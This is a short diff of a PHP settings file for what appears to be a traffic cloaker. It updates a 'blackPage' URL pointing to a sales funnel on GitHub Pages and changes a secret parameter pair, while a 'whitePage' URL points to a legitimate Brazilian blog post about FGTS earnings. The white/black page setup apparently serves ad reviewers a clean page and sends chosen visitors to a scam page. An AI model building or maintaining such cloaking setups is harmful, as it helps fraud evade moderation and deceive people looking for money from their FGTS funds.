@@ -1,10 +1,10 @@
 <?php
 // Configurações das páginas
 $whitePage = "https://meutudo.com.br/blog/lucro-fgts/";
-$blackPage = "https://portalinfos.shop/gv-lista-r/inicio/";
+$blackPage = "https://liberandoagora.github.io/Funil1Mi/inicio";
 
-$NomeParametroSeguro = "UQlCLdcHVbZq";
-$ValorParametroSeguro = "LBowyMFwmgeO";
+$NomeParametroSeguro = "RUxDSmr7ZK";
+$ValorParametroSeguro = "glvHYzZ5eU";
 
 
 
